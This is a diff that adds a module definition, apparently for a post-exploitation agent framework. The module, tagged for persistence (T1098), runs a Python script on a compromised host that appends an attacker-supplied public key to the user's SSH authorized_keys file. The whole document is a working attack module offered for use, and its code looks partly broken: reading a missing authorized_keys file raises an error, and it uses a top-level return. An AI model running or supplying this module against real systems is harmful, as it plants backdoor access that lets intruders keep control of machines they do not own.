@@ -1,0 +1,52 @@
+name: SSHKeyAdd
+authors:
+  - name: ''
+    handle: 'Werebug'
+    link: 'https://werebug.com'
+description: |
+  This module adds a provided public key to the authorized_keys file of the current user.
+software: ''
+tactics: [persistence]
+techniques:
+  - T1098
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '3.8'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: PublicKey
+    description: Public key to be added.
+    required: true
+    value: ''
+script: |-
+  import os
+
+  public_key = "{{PublicKey}}"
+  ssh_folder = os.path.join(os.path.expanduser('~'), '.ssh')
+  authorized_keys_file = os.path.join(ssh_folder, 'authorized_keys')
+
+  try:
+    try:
+      os.mkdir(ssh_folder)
+      os.chmod(ssh_folder, 0o700)
+    except FileExistsError:
+      pass
+    with open(authorized_keys_file, 'r') as f:
+      existing_content = f.read()
+      if public_key in existing_content:
+        print(f'Key already present in {authorized_keys_file}')
+        return
+    with open(authorized_keys_file, 'a') as f:
+      f.write('%s\n' % public_key)
+    print('Key added successfully.')
+  except Exception as e:
+    print(e)
+    print('Module execution failed.')
